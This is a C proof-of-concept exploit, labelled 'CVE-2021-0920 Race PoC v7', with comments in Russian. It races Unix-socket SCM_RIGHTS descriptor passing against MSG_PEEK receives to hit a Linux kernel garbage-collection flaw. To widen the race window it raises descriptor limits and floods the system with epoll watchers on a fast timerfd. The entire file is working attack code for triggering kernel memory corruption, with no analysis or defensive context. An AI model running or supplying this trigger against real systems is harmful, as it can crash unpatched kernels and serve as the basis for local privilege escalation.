#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/epoll.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <pthread.h>
#include <sched.h>
#include <errno.h>
#include <stdbool.h>

#define MAX_EPOLL_INSTANCES 500
#define MAX_DUP_FDS 100

volatile bool stop_race = false;

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    sendmsg(socket, &msg, 0);
}

int recv_fd(int socket, int flags) {
    struct msghdr msg = {0};
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    if (recvmsg(socket, &msg, flags) < 0) return -1;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int fd;
        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
        return fd;
    }
    return -1;
}

void* setup_timer_epoll(void* arg) {
    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    if (tfd < 0) { perror("timerfd_create"); return NULL; }

    int total_watchers = 0;
    // Создаём epoll до тех пор, пока не кончатся дескрипторы
    for (int i = 0; i < MAX_EPOLL_INSTANCES; i++) {
        int epfd = epoll_create1(0);
        if (epfd < 0) {
            printf("[!] Reached FD limit after %d epolls. Total watchers: %d\n", i, total_watchers);
            break;
        }
        for (int j = 0; j < MAX_DUP_FDS; j++) {
            int dupfd = dup(tfd);
            if (dupfd < 0) break; // Больше не можем
            struct epoll_event ev = { .events = EPOLLIN, .data.fd = dupfd };
            epoll_ctl(epfd, EPOLL_CTL_ADD, dupfd, &ev);
            total_watchers++;
        }
    }

    printf("[+] Timer/Epoll setup complete. Total watchers: %d\n", total_watchers);

    struct itimerspec its;
    its.it_value.tv_sec = 0;
    its.it_value.tv_nsec = 1000; // 1 мкс
    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 1000;
    timerfd_settime(tfd, 0, &its, NULL);

    while (!stop_race) {
        pause(); 
    }
    return NULL;
}

void* race_thread(void* arg) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);

    while (!stop_race) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;

        send_fd(sv[0], sv[0]);
        close(sv[0]);

        int fd = recv_fd(sv[1], MSG_PEEK);
        if (fd >= 0) {
            recv_fd(sv[1], 0);
            close(fd);
        }
        close(sv[1]);
    }
    return NULL;
}

int main() {
    printf("[*] CVE-2021-0920 Race PoC v7 (Raise FD Limit)\n");

    // Попытка поднять лимит файловых дескрипторов
    struct rlimit rlim;
    if (getrlimit(RLIMIT_NOFILE, &rlim) == 0) {
        printf("[*] Current FD limit: soft=%ld, hard=%ld\n", rlim.rlim_cur, rlim.rlim_max);
        // Пытаемся выставить максимально возможный лимит
        rlim.rlim_cur = rlim.rlim_max; 
        if (setrlimit(RLIMIT_NOFILE, &rlim) == 0) {
            printf("[+] Raised FD limit to: %ld\n", rlim.rlim_cur);
        } else {
            perror("[-] setrlimit failed");
        }
    }

    pthread_t t_setup;
    pthread_create(&t_setup, NULL, setup_timer_epoll, NULL);

    // Даем время на создание epoll-структур
    sleep(3);

    printf("[*] Starting race thread...\n");
    pthread_t t_race;
    pthread_create(&t_race, NULL, race_thread, NULL);

    sleep(60);
    stop_race = true;

    pthread_join(t_setup, NULL);
    pthread_join(t_race, NULL);

    printf("[-] PoC finished without panic.\n");
    return 0;
}